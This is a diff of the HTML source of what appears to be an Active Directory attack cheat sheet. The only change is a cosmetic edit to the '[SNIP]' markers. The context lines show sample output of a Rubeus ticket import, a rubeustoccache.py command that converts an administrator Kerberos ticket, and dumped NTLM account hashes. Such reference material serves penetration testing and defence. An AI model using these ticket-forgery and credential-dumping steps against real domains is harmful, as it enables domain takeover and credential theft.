@@ -332,7 +332,7 @@ TO-DO</div></pre></div><h4 id="2-get-current-and-target-domain-sid">2. Get curre
 </span></span></span><span class="line"><span class="cl"><span class="go">[+] Ticket successfully imported!
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi):
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIFAjCCBP ...[SNIP]... 9zdC5odGI=
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIFAjCCBP ---[SNIP]--- 9zdC5odGI=
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  ServiceName              :  cifs/dc01.example.com
 </span></span></span><span class="line"><span class="cl"><span class="go">  ServiceRealm             :  EXAMPLE.COM
@@ -357,7 +357,7 @@ TO-DO</div></pre></div><h4 id="2-get-current-and-target-domain-sid">2. Get curre
 </p><div class="tabset-wrapper" data-tabset-group="set2"><div class="tabcontent active" data-tabset="set2" data-tabcontent="tab1"><h4 id="1-convert-kirbi-to-ccache">1. Convert kirbi to ccache</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 rubeustoccache.py '<span class="o editable-keyword">&lt;BASE64_TICKET&gt;</span>' administrator.kirbi administrator.ccache
 </span></span></span></code><div class="output-bubble">Sample Output:
-<span class="line"><span class="cl"><span class="gp">$</span> python3 rubeustoccache.py <span class="s1">'doIFAjCCBP ...[SNIP]... 9zdC5odGI='</span> administrator.kirbi administrator.ccache
+<span class="line"><span class="cl"><span class="gp">$</span> python3 rubeustoccache.py <span class="s1">'doIFAjCCBP ---[SNIP]--- 9zdC5odGI='</span> administrator.kirbi administrator.ccache
 </span></span><span class="line"><span class="cl"><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">╦═╗┬ ┬┌┐ ┌─┐┬ ┬┌─┐  ┌┬┐┌─┐  ╔═╗┌─┐┌─┐┌─┐┬ ┬┌─┐
 </span></span></span><span class="line"><span class="cl"><span class="go">╠╦╝│ │├┴┐├┤ │ │└─┐   │ │ │  ║  │  ├─┤│  ├─┤├┤ 
@@ -383,7 +383,7 @@ TO-DO</div></pre></div><h4 id="2-get-current-and-target-domain-sid">2. Get curre
 </span></span></span><span class="line"><span class="cl"><span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ddf32e17a6ac5ce04a8ecbf782ca509:::
 </span></span></span><span class="line"><span class="cl"><span class="go">Guest:501:aad3b435b51404eeaad3b435b51404ee:ac2b5f88fc33b7b9e0682be85784ec0d:::
 </span></span></span><span class="line"><span class="cl"><span class="go">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:59920e994636168744039017dcf49e54:::
-</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go">---[SNIP]---
 </span></span></span></div></pre></div><p><small><em>Ref: <a href="https://github.com/SolomonSklash/RubeusToCcache">RubeusToCcache</a></em></small></p></div><div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><h4 id="1-to-do">1. TO-DO</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">TO-DO
 </span></span></span></code><div class="output-bubble">Sample Output:
